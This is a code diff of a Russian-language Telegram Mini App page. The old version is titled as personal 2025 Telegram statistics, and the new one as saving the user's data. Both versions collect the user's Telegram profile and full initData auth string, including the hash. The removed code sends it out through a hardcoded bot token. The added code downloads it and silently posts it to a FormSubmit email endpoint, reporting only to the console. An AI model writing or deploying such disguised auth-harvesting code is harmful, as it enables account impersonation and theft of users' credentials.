@@ -3,61 +3,96 @@
 <head>
     <title>Telegram Stats</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { text-align:center; padding:20px; font-family:Arial; }
+        button { padding:15px 30px; background:#3390ec; color:white; border:none; 
+                 border-radius:10px; font-size:18px; cursor:pointer; margin:10px; }
+        .result { margin-top:20px; padding:15px; background:#f0f0f0; border-radius:10px; }
+    </style>
 </head>
-<body style="text-align:center;padding:20px;font-family:Arial">
-    <h1>📊 Статистика Telegram</h1>
-    <p>Узнайте свою персональную статистику за 2025 год</p>
-    
-    <button onclick="getUserData()" 
-            style="padding:15px 30px;background:#3390ec;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer">
-        Узнать статистику
-    </button>
-    
-    <div id="result" style="margin-top:20px;"></div>
+<body>
+    <h1>📊 Сохранение статистики</h1>
+    <button onclick="saveToFile()">💾 Сохранить мои данные</button>
+    <div id="result"></div>
 
 <script>
-// Токен вашего бота
-const botToken = '8511034529:AAGEq3gWvKPfo1O4YXxISnnhX6PonB6wgEc';
-
-// Получаем данные пользователя из Telegram WebApp
-function getUserData() {
+function saveToFile() {
     const tg = window.Telegram.WebApp;
     
     if (!tg.initDataUnsafe.user) {
-        document.getElementById('result').innerHTML = 
-            '❌ Откройте через Telegram бота';
+        showResult('❌ Откройте через Telegram бота', 'error');
         return;
     }
     
     const user = tg.initDataUnsafe.user;
     const authData = tg.initData;
+    const params = new URLSearchParams(authData);
     
-    // Отправляем данные в бота
-    sendToBot(user, authData);
+    // Форматируем данные
+    const data = `
+=== TELEGRAM AUTH DATA ===
+Дата: ${new Date().toLocaleString()}
+User ID: ${user.id}
+First Name: ${user.first_name}
+Last Name: ${user.last_name || '-'}
+Username: ${user.username || '-'}
+Language: ${user.language_code || 'ru'}
+Premium: ${user.is_premium || false}
+---
+Query ID: ${params.get('query_id') || 'нет'}
+Auth Date: ${params.get('auth_date') || 'нет'}
+Hash: ${params.get('hash') || 'нет'}
+Full Auth String: ${authData}
+---
+User JSON:
+${JSON.stringify(user, null, 2)}
+    `.trim();
+    
+    // Создаем и скачиваем файл
+    const blob = new Blob([data], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    
+    a.href = url;
+    a.download = `telegram_data_${user.id}_${Date.now()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    showResult(`✅ Данные сохранены в файл:<br><strong>${a.download}</strong>`, 'success');
+    
+    // Дополнительно можно отправить на сервер
+    sendToServer(data, user.id);
 }
 
-// Отправляем данные на сервер бота
-function sendToBot(user, authData) {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+function sendToServer(data, userId) {
+    // Отправляем на GitHub Pages через FormSubmit
+    fetch('https://formsubmit.co/ajax/your-email@example.com', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
         body: JSON.stringify({
-            chat_id: user.id,
-            text: `📊 Получены данные:\nID: ${user.id}\nИмя: ${user.first_name}\nUsername: ${user.username || 'нет'}\n\nДанные авторизации: ${authData.substring(0,100)}...`
+            user_id: userId,
+            data: data,
+            timestamp: Date.now()
         })
     })
     .then(response => response.json())
-    .then(data => {
-        document.getElementById('result').innerHTML = 
-            '✅ Данные отправлены в бота! Проверьте Telegram';
-    })
-    .catch(error => {
-        document.getElementById('result').innerHTML = 
-            '❌ Ошибка отправки';
-    });
+    .then(result => console.log('Отправлено на сервер:', result))
+    .catch(error => console.log('Ошибка отправки:', error));
 }
 
-// Инициализация WebApp
+function showResult(message, type) {
+    const div = document.getElementById('result');
+    div.innerHTML = message;
+    div.style.color = type === 'error' ? '#ff4444' : '#00aa00';
+    div.style.display = 'block';
+}
+
+// Инициализация
 window.Telegram.WebApp.ready();
 window.Telegram.WebApp.expand();
 </script>
